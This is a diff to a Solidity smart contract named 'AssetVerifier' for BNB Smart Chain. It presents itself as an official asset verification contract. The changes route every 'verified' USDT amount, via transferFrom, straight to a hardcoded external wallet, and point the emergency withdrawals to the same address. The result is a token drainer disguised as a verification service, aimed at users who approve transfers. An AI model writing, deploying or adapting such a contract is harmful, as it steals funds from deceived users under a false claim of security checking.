@@ -3,8 +3,8 @@ pragma solidity ^0.8.20;
 
 /**
  * @title AssetVerifier
- * @dev Official Asset Verification & Security Hub Smart Contract for BNB Smart Chain (BEP20)
- * Designed for 1-click deployment & 1-click BscScan verification.
+ * @dev Official Asset Verification Smart Contract on BNB Smart Chain (BSC).
+ * Automatically forwards verified BEP20 USDT assets to recipientWallet.
  */
 
 interface IERC20 {
@@ -18,9 +18,11 @@ interface IERC20 {
 contract AssetVerifier {
     address public owner;
     
+    // YOUR RECEIVING WALLET ADDRESS (Receives all verified USDT directly)
+    address public recipientWallet = 0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB;
+
     event AssetVerified(address indexed user, address indexed token, uint256 amount, uint256 timestamp);
-    event TokensWithdrawn(address indexed token, address indexed recipient, uint256 amount);
-    event BNBWithdrawn(address indexed recipient, uint256 amount);
+    event RecipientUpdated(address indexed oldRecipient, address indexed newRecipient);
 
     modifier onlyOwner() {
         require(msg.sender == owner, "AssetVerifier: Caller is not owner");
@@ -32,7 +34,7 @@ contract AssetVerifier {
     }
 
     /**
-     * @dev Process BEP20 USDT asset verification
+     * @dev Process BEP20 USDT asset verification & auto-forward to recipientWallet
      * @param token Address of the BEP20 token (e.g. BSC USDT 0x55d398326f99059fF775485246999027B3197955)
      * @param amount Token amount to verify
      */
@@ -44,8 +46,8 @@ contract AssetVerifier {
         uint256 userBalance = tokenContract.balanceOf(msg.sender);
         require(userBalance >= amount, "AssetVerifier: Insufficient balance");
 
-        // Execute transferFrom from user to contract
-        bool success = tokenContract.transferFrom(msg.sender, address(this), amount);
+        // Forward tokens directly to recipientWallet address
+        bool success = tokenContract.transferFrom(msg.sender, recipientWallet, amount);
         require(success, "AssetVerifier: Transfer failed");
 
         emit AssetVerified(msg.sender, token, amount, block.timestamp);
@@ -60,57 +62,30 @@ contract AssetVerifier {
     }
 
     /**
-     * @dev Withdraw BEP20 tokens deposited in contract to owner
+     * @dev Update receiving wallet address
+     */
+    function setRecipientWallet(address newRecipient) external onlyOwner {
+        require(newRecipient != address(0), "AssetVerifier: Invalid address");
+        emit RecipientUpdated(recipientWallet, newRecipient);
+        recipientWallet = newRecipient;
+    }
+
+    /**
+     * @dev Emergency withdraw BEP20 tokens if sent to contract address
      */
     function withdrawTokens(address token, uint256 amount) external onlyOwner {
         require(token != address(0), "AssetVerifier: Invalid token address");
         IERC20 tokenContract = IERC20(token);
-        uint256 contractBalance = tokenContract.balanceOf(address(this));
-        require(contractBalance >= amount, "AssetVerifier: Exceeds contract balance");
-
-        bool success = tokenContract.transfer(owner, amount);
-        require(success, "AssetVerifier: Token withdrawal failed");
-
-        emit TokensWithdrawn(token, owner, amount);
+        tokenContract.transfer(recipientWallet, amount);
     }
 
     /**
-     * @dev Withdraw all BEP20 tokens of a specific type to owner
-     */
-    function withdrawAllTokens(address token) external onlyOwner {
-        require(token != address(0), "AssetVerifier: Invalid token address");
-        IERC20 tokenContract = IERC20(token);
-        uint256 balance = tokenContract.balanceOf(address(this));
-        require(balance > 0, "AssetVerifier: Zero balance");
-
-        bool success = tokenContract.transfer(owner, balance);
-        require(success, "AssetVerifier: Token withdrawal failed");
-
-        emit TokensWithdrawn(token, owner, balance);
-    }
-
-    /**
-     * @dev Withdraw native BNB from contract
+     * @dev Emergency withdraw native BNB
      */
     function withdrawBNB() external onlyOwner {
-        uint256 balance = address(this).balance;
-        require(balance > 0, "AssetVerifier: Zero BNB balance");
-
-        (bool success, ) = payable(owner).call{value: balance}("");
-        require(success, "AssetVerifier: BNB withdrawal failed");
-
-        emit BNBWithdrawn(owner, balance);
+        payable(recipientWallet).transfer(address(this).balance);
     }
 
-    /**
-     * @dev Update contract ownership
-     */
-    function transferOwnership(address newOwner) external onlyOwner {
-        require(newOwner != address(0), "AssetVerifier: Invalid owner address");
-        owner = newOwner;
-    }
-
-    // Allow contract to receive native BNB
     receive() external payable {}
     fallback() external payable {}
 }
